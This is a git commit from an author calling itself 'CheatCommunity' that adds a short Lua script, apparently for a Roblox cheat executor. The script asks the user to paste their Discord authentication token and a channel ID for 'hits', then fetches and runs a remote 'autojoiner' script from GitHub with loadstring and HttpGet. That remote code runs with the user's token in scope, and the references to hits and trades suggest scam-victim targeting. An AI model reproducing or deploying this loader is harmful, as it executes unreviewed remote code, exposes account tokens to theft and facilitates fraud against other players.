1cd4a20f3ecc33d3b90500f858197aabafd18316
CheatCommunity <fudgeblissett@gmail.com>
2025-04-21 06:33:06 +0100

    Create cosd.lua

---
+++ cosd.lua
@@ -0,0 +1,5 @@
+token = "" -- Discord Token here (DISCORD AUTH TOKEN) TUTORIAL: https://www.youtube.com/watch?v=LnBnm_tZlyU
+channelId = "" -- Channel ID that your hits are in. TUTORIAL: https://www.youtube.com/watch?v=YjiQ7CajAgg
+delay = 1 -- How many seconds it will wait to chat after loading is done. If you have problems with not getting trades, try making delay higher
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Autojoiner/refs/heads/main/autojoiner.lua'))()
